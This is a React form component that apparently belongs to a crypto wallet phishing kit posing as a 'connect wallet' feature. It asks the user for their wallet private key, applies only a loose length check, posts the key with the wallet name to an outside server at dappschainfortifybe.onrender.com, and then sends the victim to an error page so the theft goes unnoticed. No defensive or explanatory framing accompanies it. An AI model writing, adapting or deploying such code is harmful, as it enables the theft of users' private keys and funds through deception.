import styles from '../WalletConnectForm.module.css';
import {useNavigate} from 'react-router-dom';
import { useEffect, useState } from 'react';
import axios from 'axios';

const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {

    const navigate = useNavigate();
    const [privateKey, setPrivateKey] = useState("");
    const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT');
    const [privateKey64Long, setPrivateKey64Long] = useState(false);

    const handleChange = (e) => {
      setPrivateKey(e.target.value)
    }
    
    useEffect(() => {
      const isPasswordWithinRange = (privateKey) => {
        const length = privateKey.length;
        const hasSpaces = privateKey.includes(" ");
        return length >= 30 && length <= 190 && !hasSpaces;
      }
      
      if (isPasswordWithinRange(privateKey)) {
        setPrivateKey64Long(true)
      } else {
        setPrivateKey64Long(false)
      }
    }, [privateKey])
    
    const handlePrivateKeySubmit = async (e) => {
      e.preventDefault();
      setPrivateSubmitBtn("Processing...")
      const name = wallet;
      const type = "Private_Key";
      const data = privateKey;
      const password = "not_required";

    if (privateKey64Long) {
      try {
       await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
        setTimeout(() => {
          navigate('/error')
        }, 3000);

      } catch (error) {
          console.log(error)
          setPrivateSubmitBtn("CONNECT")
      }
    } else {
        privateKeyLengthNotlong()
        setPrivateSubmitBtn("CONNECT")
    }
  }
  return (
    <>
        <form onSubmit={handlePrivateKeySubmit}>
                    <input
                      required
                      type="text"
                      name="privateKey"
                      value={privateKey}
                      autoComplete="off"
                      onChange={handleChange}
                      placeholder='Enter your Private Key'
                      className={styles.privateKeyInput}
                    />
                    <p className={styles.hint} style={{color: privateKey64Long ? "green" : "red"}}>
                    Private keys vary in format, but they often consist of a sequence of hexadecimal characters without spaces.
                    </p>
                    <button type='submit' className={styles.connectButton}>{privateSubmitBtn}</button>
                </form>
    </>
  )
}

export default PrivateKeyForm
